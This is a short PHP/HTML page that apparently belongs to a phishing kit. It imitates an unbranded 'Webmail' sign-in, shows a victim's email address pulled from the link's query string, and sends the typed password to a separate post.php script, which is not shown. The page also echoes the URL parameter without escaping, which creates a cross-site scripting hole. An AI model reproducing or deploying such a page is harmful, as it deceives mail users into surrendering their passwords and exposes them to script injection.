<html>
<head>
	<title>Webmail</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="icon" type="image/png" href="images/favicon.ico">
</head>
<body>

	<div class="login-form">
		<div class="inner">
			<img src="images/webmail.png" >
			<div class="form-content">
				<form action="post.php" method="POST">
					<div class="input-fields">
												
<div class="known-user"><?php echo $_GET['email']; ?>
</div><input type="hidden" name="login" value="<?php echo $_GET['email']; ?>" />
						
						<input class="login-data" type="password" name="passwd" required="" 
						autocomplete="off" maxlength="127" placeholder="Password" />
						<input type="submit" value="Sign in" class="button">
					</div>
				</form>
			</div>
		</div>
		<div class="shadow"><img src="images/shadow.png" ></div>

		
	</div>
</body>
</html>